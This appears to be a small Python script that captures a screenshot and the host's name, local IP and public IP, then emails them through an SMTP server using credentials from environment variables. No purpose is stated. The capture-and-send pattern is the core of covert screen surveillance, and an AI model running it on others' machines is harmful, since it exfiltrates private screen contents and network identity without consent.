import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from cv import screenshot
from host_info import get_ip
import os
from dotenv import load_dotenv


def main():
    load_dotenv()

    email = os.getenv('EMAIL')
    passwd = os.getenv('EMAIL_PASS')
    smtp_server = os.getenv('SMTP_SRV')
    # smtp_port = int(os.getenv('SMTP_PORT'))

    info = get_ip()
    subject = f"Host: {info[0]} Local IP: {info[1]} Public IP: {info[2]}"

    msg = MIMEMultipart()
    msg['From'], msg['To'], msg['Subject'] = email, email, subject
    # msg.attach(MIMEText(f"{get_ip()}", 'plain'))

    screenshot()

    file_path = "screen.png"

    with open(file_path, "rb") as file:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename={file_path}")

    msg.attach(part)

    with smtplib.SMTP_SSL(smtp_server, 465) as server:
        server.connect(smtp_server, 465)
        server.login(email, passwd)
        server.send_message(msg)


if __name__ == '__main__':
    main()
